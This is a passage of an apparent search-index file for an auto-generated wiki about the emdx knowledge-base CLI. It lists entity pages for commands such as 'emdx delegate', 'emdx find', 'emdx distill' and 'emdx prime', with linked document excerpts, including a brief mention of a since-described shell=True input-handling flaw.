delegate</code>","text":"<p>Purpose: Handle transient failures (timeouts, rate limits) with exponential backoff.</p>"},{"location":"entities/emdx-delegate/#emdx-delegate-additions","title":"<code>emdx delegate</code> additions:","text":""},{"location":"entities/emdx-delegate/#the-vulnerability","title":"The Vulnerability","text":"<p>The <code>--each</code> flag in <code>emdx delegate</code> passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p>"},{"location":"entities/emdx-delegate/#2-ai-integration-emdx-delegate","title":"2. AI Integration (<code>emdx delegate</code>)","text":"<p>The delegate command is the single entry point for all AI-powered execution:</p>"},{"location":"entities/emdx-delegate/#2-ai-task-delegation-emdx-delegate","title":"2. AI Task Delegation (<code>emdx delegate</code>)","text":"<p>The central execution command with modes:</p>"},{"location":"entities/emdx-delegate/#3-ai-integration-emdx-delegate","title":"3. AI Integration (<code>emdx delegate</code>)","text":"<p>The <code>delegate</code> command is the single execution point for AI tasks:</p>"},{"location":"entities/emdx-delegate/#related-entities","title":"Related Entities","text":"<ul> <li><code>retry</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.0)</li> <li><code>known_flags</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=3.8)</li> <li><code>--retry n</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=3.6)</li> <li><code>single task</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=3.5)</li> <li><code>emdx task</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=3.5)</li> <li><code>emdx delegate --pr</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=3.5)</li> <li><code>emdx task ready</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=3.5)</li> <li><code>blocked</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=3.2)</li> <li><code>tests/test_delegate_commands.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=3.1)</li> <li><code>active</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=3.1)</li> </ul>"},{"location":"entities/emdx-distill/","title":"emdx distill","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-15</p>"},{"location":"entities/emdx-distill/#documents-8","title":"Documents (8)","text":"<ul> <li>#6714 Wiki Generation Architecture Research [10/10]   Section: Find integration: <p>This means wiki articles participate in:</p> </li> <li>Full-text search via <code>emdx find</code></li> <li>Semantic search via <code>emdx find --mode semantic</code></li> <li>Link graph via <code>emdx view --links</code></li> <li>Auto-linking to/from other documents</li> <li>The TUI browser</li> <li> <p><code>emdx distill</code> synthesis</p> </li> <li> <p>#6565 Delegate: Look at the synthesis_service.py \u2014 how does --synthesize wor [3/3]   Section: NOT Using synthesis_service.py</p> <p><code>synthesis_service.py</code> contains:</p> </li> <li><code>DistillService</code> \u2014 Used by <code>emdx distill</code> for audience-aware synthesis</li> <li> <p><code>SynthesisService</code> \u2014 Used by <code>emdx compact</code> for merging related documents</p> </li> <li> <p>#6467 emdx distill Command Implementation   Section: Overview</p> <p>The <code>emdx distill</code> command has been implemented to surface and synthesize knowledge base content for sharing, with audience-aware output styles. This feature addresses the need from g...</p> </li> <li> <p>#6451 Implement emdx distill command   Section: Summary</p> <p>I've successfully implemented the <code>emdx distill</code> command as specified in gameplan #6368.</p> </li> <li> <p>#6450 Implement emdx distill command   Section: Overview</p> <p>Implemented the <code>emdx distill</code> command per gameplan #6368. This command surfaces and synthesizes the best KB content for sharing, with audience-aware output.</p> </li> <li> <p>#6447 Implement emdx distill command   Section: Summary</p> <p>I've successfully implemented the <code>emdx distill</code> command as specified in the gameplan (#6368).</p> </li> <li> <p>#6446 Implement emdx distill command   Section: Implementation: emdx distill Command</p> </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing   Section: Commands</p> <p>```bash</p> </li> </ul>"},{"location":"entities/emdx-distill/#overview","title":"Overview","text":"<p>Implemented the <code>emdx distill</code> command for surfacing and synthesizing best KB content for sharing, as specified in gameplan #6368.</p>"},{"location":"entities/emdx-distill/#basic-distill-docs-by-tag","title":"Basic: distill docs by tag","text":"<p>emdx distill --tags \"security,analysis\"</p>"},{"location":"entities/emdx-distill/#related-entities","title":"Related Entities","text":"<ul> <li><code>tests/test_distill.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.7)</li> <li><code>prompt style</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>implementation: emdx distill command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>distill command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>coworkers</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>auth summary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>@app.callback(invoke_without_command=true)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>--save</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>--for</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>lazy_subcommands</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/emdx-find/","title":"emdx find","text":"<p>Type: tech_term | Mentioned in: 29 documents | First seen: 2025-07-09</p>"},{"location":"entities/emdx-find/#documents-29","title":"Documents (29)","text":"<ul> <li>#6862 Delegate: Audit README.md: Read the full README.md and check every CLI [1/3]   Section: Issues Found <p>Issue 8 \u2014 Line 167: Quick reference pipe syntax</p> </li> </ul> <pre><code>| Ask your KB a question | `emdx find --context \"question\" \\| claude` |\n</code></pre> <p>The <code>\\|</code> escape is needed for the markdown table. This renders correctly. Correct.</p> <ul> <li> <p>#6746 Delegate: Research Obsidian community plugins for auto-linking and kno [5/5]   Section: 2. Dataview Plugin</p> <p>Relevance to emdx: The metadata query model is interesting. Dataview proves that frontmatter + a query language is a powerful combination for surfacing connections. Our tag/category system + <code>emdx find</code> serves a similar role.</p> </li> <li> <p>#6714 Wiki Generation Architecture Research [10/10]   Section: Find integration:</p> <p>```bash $ emdx find --tags \"wiki-article\" $ emdx find \"authentication\" --tags \"wiki-article\" $ emdx view 6800   # view a wiki article like any doc</p> </li> </ul> <pre><code>\n- **#6713** wiki-schema-research\n  *Section: Design Decision: Self-Hosting vs. Separate Tables*\n  &gt; **Pros:**\n- Immediately searchable via FTS5, links, tags, embeddings\n- No parallel content system to maintain\n- Wiki articles show up in `emdx find`, `emdx view`, link graphs\n- Existing compact command already saves synthesis results as documents\n\n- **#6661** Prime Command Redesign Research [2/3]\n  *Section: Section-by-section classification*\n  &gt; ...ask add` encourages creating new tasks when the sub-agent should just do its job. `emdx find`/`emdx save` are the only relevant ones | `harmful-for-subagent` |\n| **ACTIVE EPICS** (full prime) | ~6 | **Useful** \u2014 project orientation | **Noise** \u2014 a sub-agent...\n\n- **#6649** Delegate: README Tools-It-Replaces Angle [3/10]\n  *Section: emdx*\n  &gt; ...d | emdx equivalent |\n|---|---|\n| **Notes app** (Notion, Obsidian) | `emdx save`, `emdx find`, `emdx tag` |\n| **Task tracker** (Linear, GitHub Issues) | `emdx task add`, `emdx task ready`, `emdx task epic` |\n| **RAG pipeline** (LangChain, custom scripts) | `...\n\n- **#6597** Delegate: Research the first-5-minutes experience after 'pip install e [4/4]\n  *Section: Current First-Run Experience: Step by Step*\n  &gt; **Missing**:\n- No \"Now try: emdx find &lt;keyword&gt;\" hint\n- No explanation of what just happened conceptually\n\n- **#6592** Delegate: Research the first-5-minutes experience after 'pip install e [4/4]\n  *Section: Goal: Aha moment in under 2 minutes*\n  &gt; \ud83d\udd0d Find it later:\n   emdx find \"keyword\"             # Full-text search\n   emdx recent                     # Recently accessed\n\n- **#6591** Delegate: Research what an 'emdx init' command should do for first-run [2/4]\n  *Section: Minimum Viable Init*\n  &gt; emdx view 1       # Read the getting started guide\n  emdx save \"note\"  # Save your first real note\n  emdx find \"query\" # Search your knowledge base\n  emdx delegate \"analyze something\"  # Run an AI task\n\n- **#6572** Delegate: List the 3 most important files in emdx/services/ and say on [2/2]\n  *Section: 3 Most Important Files in emdx/services/*\n  &gt; ## 2. `unified_search.py`\nThe central search orchestrator that combines FTS5 full-text search, tag-based filtering, and semantic/embedding search into a single unified interface for the `emdx find` command.\n\n- **#6533** EMDX Future Directions: Agent-First Design [1/4]\n  *Section: Feature Ideas*\n  &gt; #### B. `emdx context` \u2014 Session Context Builder\n```bash\n# Build context from recent activity\nemdx context \"auth refactor\"  # Finds relevant docs, tasks, learnings\n</code></pre> <p>Rationale: Intelligent context assembly vs. manual <code>emdx find</code> queries.</p> <ul> <li> <p>#6438 Delegate: Update docs/cli-api.md: The emdx find command now supports h [1/3]</p> <p>Updated docs/cli-api.md to document hybrid search options for <code>emdx find</code>:</p> </li> <li> <p>#6439 Delegate: Update CLAUDE.md: In the Essential Commands section (around  [3/3]   Section: Changes Made</p> <ol> <li>Updated Search block (lines 129-133):</li> </ol> </li> <li>Added comment clarifying <code>emdx find \"query\"</code> is full-text search (default)</li> <li>Added <code>emdx find \"concept\" --mode semantic</code> for semantic/conceptual search</li> <li> <p>Added <code>emdx find \"query\" --extract</code> for e...</p> </li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: CLI Interface Changes</p> </li> </ul> <pre><code>--confidence high               # Filter by confidence\n--has-task                      # Has associated task\n--review-status pending         # Filter by review status\n</code></pre> <ul> <li>#6409 Delegate: Research and design smarter context injection for emdx deleg [1/2]   Section: 1. Document Selection Strategy <p>```python</p> </li> </ul>"},{"location":"entities/emdx-find/#emdx-find-additions","title":"<code>emdx find</code> additions:","text":""},{"location":"entities/emdx-find/#use-the-same-search-infrastructure-as-emdx-find","title":"Use the same search infrastructure as <code>emdx find</code>","text":"<p>from emdx.services.unified_search import UnifiedSearchService, SearchQuery</p> <ul> <li>#6397 Delegate: Design a concrete 'dual-interface' architecture for EMDX whe [2/3]   Section: Part 1: Output Modes </li> <li><code>emdx find</code> has <code>--json</code> and <code>--ids-only</code> \u2713</li> <li><code>emdx list</code> has <code>--format table|json|csv</code> \u2713  </li> <li>Most other commands output only human-readable Rich tables</li> <li> <p>Inconsistent: some commands print IDs after save, others don't</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 1. Command Redundancy - HIGH IMPACT</p> <p>Search commands spread across 3 locations:</p> </li> <li><code>emdx find</code> (core.py) - FTS search</li> <li><code>emdx ai search</code> (ask.py) - semantic search  </li> <li><code>emdx ai similar</code> (ask.py) - similarity search</li> <li> <p>Suggestion: Consolidate under `emdx fi...</p> </li> <li> <p>#6278 Delegate: DEBT-9: Fix migration debt. Create new migration files (foll   Section: DEBT-9: Fix Migration Debt</p> <p>This improves performance for case-insensitive title searches in CLI commands like <code>emdx find</code> and <code>emdx list</code>.</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 5. MISSING CLI INTEGRATION TESTS</p> <p>...-----| | <code>emdx save</code> | Basic save | <code>--auto-tag</code>, <code>--supersede</code>, stdin piping | | <code>emdx find</code> | Basic search | <code>--sort</code>, <code>--limit</code>, <code>--offset</code>, <code>--project</code> | | <code>emdx delegate</code> | Unit tests only | Full CLI integration with mocked executor | | <code>emdx tag</code> | Add...</p> </li> <li> <p>#6222 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: Commands with partial CLI tests:</p> <p>...---| | <code>emdx save</code> | Help/error only | Success path, stdin input, --tags flag | | <code>emdx find</code> | Help only | Actual search results, output formatting | | <code>emdx view</code> | Help only | Document display, not-found handling | | <code>emdx delete</code> | Help only | Soft/hard...</p> </li> <li> <p>#6214 CI Fix: PR #454 Semantic Find Tests   Section: PR #454 CI Fix - Semantic Find Tests</p> </li> <li> <p>#6164 Delegate: Audit CLAUDE.md (578 lines) for accuracy. Check: (1) does it [6/17]   Section: Stale References Summary</p> <p>...ommands All other commands in the document were verified to exist:</p> </li> <li><code>emdx save</code>, <code>emdx find</code>, <code>emdx list</code>, <code>emdx view</code>, <code>emdx recent</code></li> <li><code>emdx tag add/remove/list/legend</code></li> <li><code>emdx prime</code>, <code>emdx status</code></li> <li><code>emdx task create/ready/...</code></li> <li> <p><code>emdx delegate</code> (with al...</p> </li> <li> <p>#6158 Delegate: analysis [5/5]   Section: Key Features</p> </li> <li>Save: Files, stdin, direct text \u2192 <code>emdx save</code></li> <li>Search: Full-text FTS5 search \u2192 <code>emdx find</code></li> <li>View/Edit: Document lifecycle management</li> <li> <p>Tags: Emoji-based tagging with text aliases</p> </li> <li> <p>#6152 PR Review: #454 Semantic Find Upgrade   Section: Alignment with Gameplan #6100 \u2705</p> <p>...| <code>HYBRID_BOOST=0.15</code> | \u2705 | | <code>--mode</code> flag (keyword/semantic/hybrid) | Added to <code>emdx find</code> | \u2705 | | <code>--extract</code> flag for chunk text | Added to <code>emdx find</code> | \u2705 | | Backward compatible default | Hybrid if index exists, keyword otherwise | \u2705 | | FTS5 score no...</p> </li> <li> <p>#6145 Delegate: Read gameplan by running: emdx view 6100. Implement the Sema [4/7]   Section: Key Features Implemented</p> <ol> <li>Updated CLI</li> </ol> </li> <li><code>emdx find</code> now uses hybrid search by default (when index exists)</li> <li><code>--mode keyword|semantic|hybrid</code> for explicit control</li> <li> <p><code>--extract</code> flag shows matching chunk text...</p> </li> <li> <p>#6100 Gameplan #4: Semantic Find Upgrade   Section: Gameplan #4: Semantic Find Upgrade (Hybrid + Chunk-Level Search)</p> </li> <li> <p>#6094 EMDX Feature Deep Dive - Claude-First Design   Section: FEATURE 5: Semantic <code>emdx find</code> Upgrade</p> </li> <li> <p>#6092 PROZE/EMDX Feature Exploration - 10 Paths Deep Dive   Section: PATH 2: Semantic Search \u2014 <code>emdx find</code> on Steroids</p> </li> <li> <p>#293 emdx Tag System Implementation Plan   Section: 2. Search Enhancement</p> </li> </ul>"},{"location":"entities/emdx-find/#current-state-in-emdx","title":"Current State in EMDX","text":""},{"location":"entities/emdx-find/#problem","title":"Problem","text":"<p>The PR introduced hybrid search as the default mode for <code>emdx find</code>. The existing tests mocked <code>search_documents</code>, but hybrid search bypasses this function entirely, calling <code>HybridSearchService.search()</code> instead. This caused 4 test...</p>"},{"location":"entities/emdx-find/#1-core-knowledge-base","title":"1. Core Knowledge Base","text":""},{"location":"entities/emdx-find/#vision","title":"Vision","text":"<p><code>emdx find</code> becomes a single unified search that combines keyword matching (fast, exact) with semantic search (conceptual). Plus: chunk-level indexing so long docs return just the relevant paragraph, not 5000 words.</p>"},{"location":"entities/emdx-find/#the-problem","title":"The Problem","text":"<p><code>emdx find</code> is keyword-only. <code>emdx ai search</code> is semantic-only. They're separate commands. Claude has to decide which to use.</p>"},{"location":"entities/emdx-find/#hybrid-keyword-semantic","title":"Hybrid: keyword + semantic","text":"<p>emdx find \"auth\" --semantic</p>"},{"location":"entities/emdx-find/#update-emdx-find-with-tag-support","title":"Update <code>emdx find</code> with tag support","text":"<p>```python</p>"},{"location":"entities/emdx-find/#in-emdxcorepy-modify-find_documents","title":"In emdx/core.py, modify find_documents()","text":"<p>def find_documents(search_term: str = None, tags: List[str] = None,                     tag_mo...</p>"},{"location":"entities/emdx-find/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx tag</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>git init</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>chunk_embeddings</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>why it matters for claude</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>tools handle first run</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>to use proze as the diff driver for *.md files...\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>test_list_command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>session design</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>emdx list</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.6)</li> <li><code>--extract</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.6)</li> </ul>"},{"location":"entities/emdx-prime-smart/","title":"emdx prime --smart","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdx-prime-smart/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6149 Delegate: Review PR #451 (Knowledge Decay). Run: gh pr diff 451. Check [4/7]   Section: PR #451 Review: Knowledge Decay Feature</p> </li> <li> <p>#6146 Delegate: Review PR #446 (Smart Priming). Run: gh pr diff 446. Check c [1/7]</p> </li> </ul>"},{"location":"entities/emdx-prime-smart/#summary","title":"Summary","text":"<p>PR implements Knowledge Decay feature per gameplan #6102. Adds <code>emdx stale</code> and <code>emdx touch</code> commands plus <code>emdx prime --smart</code> integration.</p>"},{"location":"entities/emdx-prime-smart/#pr-446-review-smart-priming-emdx-prime-smart","title":"PR #446 Review: Smart Priming (<code>emdx prime --smart</code>)","text":""},{"location":"entities/emdx-prime-smart/#summary_1","title":"Summary","text":"<p>PR adds <code>--smart</code> flag to <code>emdx prime</code> command implementing context-aware priming per gameplan #6099. ## Gameplan Compliance \u2705</p> <p>| Requirement | Status | Notes | |------------|--------...</p> <ul> <li>#6142 Delegate: Read gameplan by running: emdx view 6102. Implement the Know [6/7]   Section: New Commands <ol> <li><code>emdx prime --smart</code> - Include top stale docs in priming context</li> </ol> </li> <li> <p>Shows CRITICAL/WARNING tier docs for Claude to address</p> </li> <li> <p>#6138 Delegate: Read gameplan by running: emdx view 6099. Implement the Smar [3/7]   Section: Smart Priming Feature Implementation Complete</p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: The 7 Features</p> <p>...B | #6098 | feat/auto-linking | pending | | 3 | Smart Priming \u2014 context-aware <code>emdx prime --smart</code> | #6099 | feat/smart-priming | pending | | 4 | Semantic Find Upgrade \u2014 hybrid + chunk-level search | #6100 | feat/semantic-find | pending | | 5 | **Dream Journa...</p> </li> <li> <p>#6102 Gameplan #6: Knowledge Decay &amp; Spaced Resurfacing   Section: User Experience</p> </li> </ul> <pre><code>emdx prime --smart\n# ... normal prime output ...\n#\n# \u23f0 Review needed:\n#   #6023 \"API Architecture\" \u2014 47d stale, HIGH importance\n</code></pre> <ul> <li>#6099 Gameplan #3: Smart Priming   Section: User Experience </li> </ul> <pre><code>emdx prime --smart\n# EMDX CONTEXT \u2014 Project: proze\n#\n# \ud83d\udcc5 Recent activity (last 7 days):\n#   #6094 \"Feature Deep Dive\" (yesterday, 3 views)\n#   #6091 \"Prototype Results\" (yesterday)\n#...\n\n- **#6098** Gameplan #2: Auto-Linking on Save\n  *Section: Implementation Steps*\n  &gt; ...ria\n- Claude can run `emdx links &lt;id&gt;` to see what's related before researching\n- `emdx prime --smart` can traverse links to pull in contextually relevant docs\n- The KB feels like a graph, not a flat list\n- Reduces redundant research by surfacing \"you already have so...\n\n- **#6094** EMDX Feature Deep Dive - Claude-First Design\n  *Section: FEATURE 1: Smart Priming (`emdx prime --smart`)*\n  &gt; ```bash\nemdx prime --smart\n</code></pre> <ul> <li>#6092 PROZE/EMDX Feature Exploration - 10 Paths Deep Dive   Section: PATH 6: Context-Aware Priming \u2014 Smart Session Bootstrap </li> </ul>"},{"location":"entities/emdx-prime-smart/#summary_2","title":"Summary","text":"<p>Implemented the Smart Priming feature (<code>emdx prime --smart</code>) as described in gameplan #6099.</p>"},{"location":"entities/emdx-prime-smart/#integrated-into-prime","title":"Integrated into prime:","text":""},{"location":"entities/emdx-prime-smart/#proposed-smart-prime","title":"Proposed (smart prime):","text":""},{"location":"entities/emdx-prime-smart/#cli-usage","title":"CLI Usage","text":"<p>```bash</p>"},{"location":"entities/emdx-prime-smart/#smart-prime-looks-at-what-youre-working-on","title":"Smart prime \u2014 looks at what you're working on","text":"<p>emdx prime --smart</p>"},{"location":"entities/emdx-prime-smart/#detects-youre-in-projectsproze","title":"Detects: you're in ~/projects/proze","text":""},{"location":"entities/emdx-prime-smart/#searches-kb-for-docs-tagged-with-proze-project","title":"Searches KB for docs tagged with \"proze\" project","text":""},{"location":"entities/emdx-prime-smart/#also-searches-semantically-for-recent-related-work","title":"Also searches semantically for recent related work","text":""},{"location":"entities/emdx-prime-smart/#outputs-relevant-con","title":"Outputs: relevant con...","text":""},{"location":"entities/emdx-prime-smart/#related-entities","title":"Related Entities","text":"<ul> <li><code>why it matters for claude</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>spaced resurfacing</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>session design</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>feature deep dive</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>daily digest \u2014 feb 13, 2026</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>daily digest</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>claude claude</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>auth research</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>ask the kb</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>... normal prime output ...</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/emdx-prime/","title":"emdx prime","text":"<p>Type: tech_term | Mentioned in: 41 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdx-prime/#documents-41","title":"Documents (41)","text":"<ul> <li>#6862 Delegate: Audit README.md: Read the full README.md and check every CLI [1/3]   Section: Issues Found <p>...knowledge base exploration</p> </li> <li><code>emdx gist</code> \u2014 GitHub Gist creation from documents</li> <li><code>emdx prime</code> \u2014 Session priming for Claude Code</li> <li><code>emdx trash</code> \u2014 Trash management (list/restore/purge)</li> <li> <p><code>emdx delete</code> \u2014 Document deletion</p> </li> <li> <p>#6719 Wiki Generation Quality Assessment &amp; Feedback Loops   Section: Integration with stale.py</p> <p>Wiki articles get the same access-staleness tracking, plus source-staleness as a second dimension. Surface both in <code>emdx prime</code> and <code>emdx stale</code>.</p> </li> <li> <p>#6677 Delegate Slimming Research [2/3]   Section: Conflict 4: \"Session Start Protocol\" (Project CLAUDE.md, lines 137\u2013143)</p> <p>Current text:</p> </li> </ul> <pre><code>### Session Start Protocol\n```bash\nemdx prime    # Get current work context (ready tasks, in-progress, recent docs)\nemdx status   # Quick overview\n</code></pre> <p>Note: With hooks active, <code>emdx prime</code> runs automatically...</p> <ul> <li> <p>#6670 Prime Command Redesign Research [synthesis]   Section: Core Finding</p> <p>The research reveals a fundamental design flaw: emdx prime sends the same output to human sessions and delegate sub-agents, despite these having opposite needs. The industry has converged on a clear principle: **prime is a n...</p> </li> <li> <p>#6661 Prime Command Redesign Research [2/3]   Section: Current state</p> <p>The hook runs <code>emdx prime --quiet</code> for all sessions (human and delegate alike). There's no detection of whether the session is a sub-agent or a human. But the human interactive session (t...</p> </li> <li> <p>#6660 Prime Command Redesign Research [3/3]   Section: Implementation</p> <p>...DOC_ID\" 2&gt;/dev/null || true     fi else     # HUMAN context \u2014 full orientation     emdx prime 2&gt;/dev/null || true fi</p> </li> <li> <p>#6652 Delegate: Document #6643 (README Rewrite Strategy for 0.19.0): META ANGLE [7/10]   Section: The Pitch (30 lines max)</p> <p>...reads the saved research, writes the fix, opens a PR</p> </li> <li> <p>Next session starts with <code>emdx prime</code> \u2014 picks up exactly where the last one left off</p> </li> <li> <p>#6651 Delegate: Document #6643 (README Rewrite Strategy for 0.19.0): README Angle 1 - Compound Loop Narrative [1/10]   Section: See it in action</p> <p>\u200b```bash</p> </li> </ul>"},{"location":"entities/emdx-prime/#new-session-claude-checks-what-exists-before-doing-anything","title":"New session. Claude checks what exists before doing anything.","text":"<p>$ emdx prime \ud83d\udccb Ready tasks: 0  |  In-progress: 0  |  Recent: #42 Auth Bug Analysis</p> <ul> <li>#6648 Delegate: Document #6643 (README Rewrite Strategy for 0.19.0): README [10/10]   Section: emdx <p>...s actually does to your velocity:**</p> </li> <li>Sessions start where the last one left off (<code>emdx prime</code>)</li> <li>10 agents run in parallel while you review the last batch</li> <li>Every finding, decision, and dead end is saved and searchable</li> <li> <p>Tasks track what's next so you never...</p> </li> <li> <p>#6647 Delegate: Document #6643 (README Rewrite Strategy for 0.19.0): Before/After Contrast [2/10]   Section: With emdx</p> <p>...dit related code. Tracks the remaining fixes as tasks.</p> <p>Next day, new session. <code>emdx prime</code>. Claude sees yesterday's analysis, the agent reports, the open tasks. It picks up mid-thought.</p> <p>Every session starts where the last one left off.</p> </li> <li> <p>#6595 Delegate: Research what an 'emdx init' command should do for first-run [2/4]   Section: CLAUDE.md Integration (--claude flag)</p> <p>CLAUDE.md now includes:</p> </li> <li>Session start protocol (emdx prime)</li> <li>Save/search/tag commands</li> <li>Delegate usage instructions</li> </ul> <pre><code>\n- **#6591** Delegate: Research what an 'emdx init' command should do for first-run [2/4]\n  *Section: Current emdx State*\n  &gt; emdx already has implicit initialization:\n- Database auto-creates on first use (`~/.config/emdx/knowledge.db`)\n- Schema migrations run automatically\n- No explicit init command exists\n- `emdx prime` and `emdx status` work immediately after install\n\n- **#6561** Session Summary (2026-02-16 00:52)\n  *Section: Key Accomplishments*\n  &gt; ...ncement Planning \u2705\n- **5 gameplans synthesized** covering:\n  - Recent failures in `emdx prime` (#6560)\n  - `--retry N` flag implementation (#6558)\n  - `--memory N` flag implementation (#6556)\n  - `emdx wrapup` command (#6555, #6557)\n  - Additional enhancement...\n\n- **#6560** Delegate: Recent Failures in emdx prime\n  *Section: Summary*\n  &gt; Successfully implemented the \"recent 